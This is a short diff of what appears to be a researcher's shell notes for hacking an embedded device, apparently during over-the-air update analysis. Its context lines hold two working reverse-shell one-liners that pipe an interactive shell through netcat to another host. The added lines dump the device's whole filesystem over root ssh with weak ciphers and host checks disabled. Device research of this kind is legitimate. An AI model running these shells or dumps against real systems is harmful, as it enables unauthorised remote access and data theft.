@@ -31,3 +31,18 @@ tail -f /tmp/messages | grep predownload-ota
 ((export file="/tmp/a"; export port="4444";rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 192.168.0.23 $port >$file)&)
 ((export file="/tmp/b"; export port="4450";rm -rf $file; mkfifo $file;cat $file|/bin/sh -i 2>&1|nc 192.168.0.23 $port >$file)&)
 
+# Copy all filesystem to host machine
+ssh \
+-oKexAlgorithms=+diffie-hellman-group1-sha1 \
+-c 3des-cbc \
+-o UserKnownHostsFile=/dev/null \
+root@192.168.0.21 \
+/tmp/busybox tar czvf - \
+--exclude 'sys/bus/*' \
+--exclude 'sys/devices/*' \
+--exclude 'sys/class/firmware/timeout' \
+--exclude 'sys/kernel/rcu_expedited' \
+--exclude 'sys/kernel/*' \
+--exclude 'sys/module/sg/srcversion' \
+--exclude 'sys/module/*' \
+/ > /Users/andres/Desktop/file.tar.gz
